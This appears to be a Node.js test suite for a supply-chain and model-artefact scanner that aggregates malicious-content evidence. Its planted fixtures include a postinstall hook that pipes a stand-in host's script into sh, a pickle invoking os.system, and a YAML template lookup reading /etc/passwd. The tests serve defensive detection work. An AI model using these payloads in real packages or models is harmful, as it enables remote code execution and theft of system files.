import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { maliciousContentEvidence } from '../malicious-content-evidence.mjs';
import { scan as depsScan } from '../../bin/deps-content.mjs';
import { scan as vendorScan } from '../../bin/vendor-scan.mjs';
import { scanTree as modelScan } from '../../bin/model-artefacts.mjs';

const b = (...parts) => Buffer.concat(parts.map((p) => (Buffer.isBuffer(p) ? p : Buffer.from(p, 'latin1'))));
const binunicode = (s) => b('X', Buffer.from(Uint32Array.of(Buffer.byteLength(s)).buffer), s);
// Pickle bytes are written to disk and read by an opcode walker; nothing here unpickles them.
const EVIL_PICKLE = b('\x80\x02', 'cos\nsystem\n', 'q\x00', binunicode('true'), 'q\x01', '\x85', 'q\x02', 'R', 'q\x03', '.');
const BENIGN_PICKLE = b('\x80\x02', '}', 'q\x00', '.');

const LOCK = {
  name: 'fixture', lockfileVersion: 3,
  packages: {
    '': { name: 'fixture' },
    'node_modules/evil': { version: '1.0.0', resolved: 'https://registry.npmjs.org/evil/-/evil-1.0.0.tgz', integrity: 'sha512-AAAA', hasInstallScript: true },
    'node_modules/native': { version: '2.0.0', resolved: 'https://registry.npmjs.org/native/-/native-2.0.0.tgz', integrity: 'sha512-BBBB', hasInstallScript: true },
    'node_modules/nohash': { version: '1.0.0', resolved: 'https://registry.npmjs.org/nohash/-/nohash-1.0.0.tgz' },
    'node_modules/plain': { version: '3.0.0', resolved: 'https://registry.npmjs.org/plain/-/plain-3.0.0.tgz', integrity: 'sha512-CCCC' },
  },
};
const DATASET_YAML = `configs:
  - config_name: default
    data_files:
      - split: train
        path: "{{ lookup('file', '/etc/passwd') }}"
      - split: test
        path: s3://bucket.invalid/test.parquet
`;
const LOADER_PY = `from transformers import AutoModel
m = AutoModel.from_pretrained("org/model", trust_remote_code=True)
d = load_dataset("org/ds", revision="main")
`;

function tree(files) {
  const root = mkdtempSync(join(tmpdir(), 'cw-mce-'));
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(dirname(join(root, rel)), { recursive: true });
    writeFileSync(join(root, rel), body);
  }
  return root;
}

const planted = () => tree({
  'package-lock.json': JSON.stringify(LOCK),
  'node_modules/evil/package.json': JSON.stringify({ version: '1.0.0', scripts: { postinstall: 'curl -s http://example.invalid/x | sh' } }),
  'node_modules/native/package.json': JSON.stringify({ version: '2.0.0', scripts: { install: 'node-gyp rebuild' } }),
  'node_modules/nohash/package.json': JSON.stringify({ version: '1.0.0' }),
  'node_modules/plain/package.json': JSON.stringify({ version: '3.0.0' }),
  'vendor/jq.js': '/*! jQuery v3.4.1 */\nvar jq = 1;\n',
  'vendor/mystery.js': 'var mystery = 1;\n',
  'models/evil.pkl': EVIL_PICKLE,
  'models/ok.pkl': BENIGN_PICKLE,
  'models/broken.h5': 'not an hdf5 file',
  'data/config.yaml': DATASET_YAML,
  'load.py': LOADER_PY,
});

async function reports(root, { offline = true } = {}) {
  return {
    dependencyReport: depsScan(root, {}).report,
    vendorReport: await vendorScan(root, { offline, index: null }),
    modelReport: modelScan(root),
  };
}

const byId = (r) => Object.fromEntries(r.observations.map((o) => [o.subject, o]));

test('the real producers over a planted tree give one observation per surface, classed by what was measured', async (t) => {
  const root = planted();
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const r = maliciousContentEvidence(await reports(root));
  const o = byId(r);

  assert.equal(o['model:models/evil.pkl'].class, 'dangerous-behaviour');
  assert.equal(o['model:models/evil.pkl'].confidence, 'demonstrated');
  assert.deepEqual(o['model:models/evil.pkl'].advisoryIds, []);
  assert.equal(o['model:models/evil.pkl'].observed[0].behaviour, 'dangerous-opcode-demonstrated');

  assert.equal(o['dependency:node_modules/evil'].class, 'candidate');
  assert.equal(o['dependency:node_modules/evil'].type, 'installed-dependency');
  assert.deepEqual(o['dependency:node_modules/evil'].static.map((s) => s.capability), ['install-hook']);

  assert.equal(o['model:data/config.yaml'].class, 'candidate');
  assert.equal(o['model:data/config.yaml'].type, 'dataset-loader');
  assert.deepEqual(o['model:data/config.yaml'].static.map((s) => s.capability).sort(), ['dynamic-eval', 'remote-data-path']);
  assert.equal(o['model:load.py'].class, 'candidate');
  assert.deepEqual(o['model:load.py'].static.map((s) => s.capability), ['dynamic-eval']);

  assert.equal(o['model:models/broken.h5'].class, 'unreadable');
  assert.equal(o['model:models/broken.h5'].gaps[0].reason, 'unreadable');

  for (const v of ['vendored:vendor/jq.js', 'vendored:vendor/mystery.js']) {
    assert.equal(o[v].class, 'not-examined', `${v} content was never inspected`);
    assert.equal(o[v].type, 'vendored-javascript');
  }
});

test('benign controls produce no observation and nothing is ever nothing-observed by default', async (t) => {
  const root = planted();
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const r = maliciousContentEvidence(await reports(root));
  const ids = r.observations.map((o) => o.subject);
  for (const benign of ['dependency:node_modules/native', 'dependency:node_modules/plain', 'dependency:node_modules/nohash', 'model:models/ok.pkl']) {
    assert.ok(!ids.includes(benign), `${benign} is counted, not listed`);
  }
  assert.ok(r.observations.every((o) => o.class !== 'nothing-observed'));
  assert.ok(!r.observations.some((o) => /malware/i.test(o.class)));
});

test('integrity signals are kept apart from content evidence, not dropped or promoted', async (t) => {
  const root = planted();
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const r = maliciousContentEvidence(await reports(root));
  assert.deepEqual(r.integrity.map((i) => [i.producer, i.path, i.rule]), [
    ['deps-content', 'node_modules/nohash', 'dep-missing-integrity'],
    ['model-artefacts', 'load.py', 'hf-unpinned-revision'],
  ]);
  assert.deepEqual(r.unmapped, []);
});

test('each producer states what it examined and what it never looks at', async (t) => {
  const root = planted();
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const { producers } = maliciousContentEvidence(await reports(root));
  assert.equal(producers['deps-content'].state, 'ran');
  assert.equal(producers['deps-content'].examined, 4);
  assert.match(producers['deps-content'].scope, /other package content not read/);
  assert.equal(producers['vendor-scan'].state, 'advisories-incomplete');
  assert.match(producers['vendor-scan'].reason, /offline/);
  assert.match(producers['vendor-scan'].scope, /vendored content not inspected/);
  assert.equal(producers['model-artefacts'].state, 'ran');
  assert.ok(producers['model-artefacts'].examined >= 4);
  assert.deepEqual(producers['model-artefacts'].unlisted, { unreadable: 0, oversize: 0, kerasWithoutConfig: 0, tfGraphsWithoutNodes: 0 });
});

test('vendored advisories attach to the subject without making its content examined', async (t) => {
  const root = planted();
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const rep = await reports(root);
  rep.vendorReport = { ...rep.vendorReport, ran: true, reason: null, findings: [{ file: 'vendor/jq.js', package: 'jquery', version: '3.4.1', id: 'GHSA-test-0002' }, { file: 'vendor/jq.js', package: 'jquery', version: '3.4.1', id: 'GHSA-test-0001' }] };
  const r = maliciousContentEvidence(rep);
  const jq = byId(r)['vendored:vendor/jq.js'];
  assert.deepEqual(jq.advisoryIds, ['GHSA-test-0001', 'GHSA-test-0002']);
  assert.equal(jq.class, 'not-examined');
  assert.equal(r.producers['vendor-scan'].state, 'ran');
});

test('a producer that did not run, could not run or had no surface is stated, never empty-clean', async (t) => {
  const none = maliciousContentEvidence({});
  assert.deepEqual(none.observations, []);
  assert.deepEqual(Object.values(none.producers).map((p) => p.state), ['not-run', 'not-run', 'not-run']);

  const bad = tree({ 'package-lock.json': '{ not json' });
  const empty = tree({ 'README.txt': 'nothing here' });
  t.after(() => { rmSync(bad, { recursive: true, force: true }); rmSync(empty, { recursive: true, force: true }); });
  assert.equal(maliciousContentEvidence({ dependencyReport: depsScan(bad, {}).report }).producers['deps-content'].state, 'could-not-run');
  assert.equal(maliciousContentEvidence({ dependencyReport: depsScan(empty, {}).report }).producers['deps-content'].state, 'void');
  assert.equal(maliciousContentEvidence({ modelReport: modelScan(empty) }).producers['model-artefacts'].state, 'void');
});

test('oversize and capped lists become gaps and stated bounds', async (t) => {
  const files = { 'models/big.pkl': Buffer.alloc(4096, 0x41) };
  for (let i = 0; i < 52; i++) files[`models/broken-${String(i).padStart(2, '0')}.h5`] = 'not hdf5';
  const root = tree(files);
  const prev = process.env.CW_MODEL_MAX_BYTES;
  process.env.CW_MODEL_MAX_BYTES = '1024';
  t.after(() => {
    if (prev === undefined) delete process.env.CW_MODEL_MAX_BYTES; else process.env.CW_MODEL_MAX_BYTES = prev;
    rmSync(root, { recursive: true, force: true });
  });
  const r = maliciousContentEvidence({ modelReport: modelScan(root) });
  const big = byId(r)['model:models/big.pkl'];
  assert.equal(big.class, 'not-examined');
  assert.equal(big.gaps[0].reason, 'oversize');
  assert.equal(r.producers['model-artefacts'].unlisted.unreadable, 2);
  assert.equal(r.observations.filter((o) => o.class === 'unreadable').length, 50);
});

test('a rule outside the mapped vocabulary is preserved as unmapped', () => {
  const r = maliciousContentEvidence({
    modelReport: { tool: 'model-artefacts', summary: { filesScanned: 1 }, findings: [{ rule: 'tf-graph-file-op', path: 'g.pb', detail: 'ReadFile' }] },
  });
  assert.deepEqual(r.unmapped, [{ producer: 'model-artefacts', path: 'g.pb', rule: 'tf-graph-file-op', detail: 'ReadFile' }]);
  assert.deepEqual(r.observations, []);
});

test('malformed producer reports are refused', () => {
  assert.throws(() => maliciousContentEvidence({ dependencyReport: { tool: 'model-artefacts', summary: {}, findings: [] } }), /dependencyReport must be a deps-content report/);
  assert.throws(() => maliciousContentEvidence({ modelReport: { tool: 'model-artefacts', summary: {}, findings: 'x' } }), /modelReport\.findings must be an array/);
  assert.throws(() => maliciousContentEvidence({ modelReport: { tool: 'model-artefacts', findings: [] } }), /modelReport\.summary/);
  assert.throws(() => maliciousContentEvidence({ modelReport: { tool: 'model-artefacts', summary: {}, findings: [{ rule: 'x' }] } }), /has no path/);
  assert.throws(() => maliciousContentEvidence({ vendorReport: { tool: 'vendor-scan', summary: {}, findings: [], identified: [] } }), /vendorReport\.unidentified must be an array/);
});

test('the same tree gives byte-identical output', async (t) => {
  const root = planted();
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const one = JSON.stringify(maliciousContentEvidence(await reports(root)));
  const two = JSON.stringify(maliciousContentEvidence(await reports(root)));
  assert.equal(one, two);
});
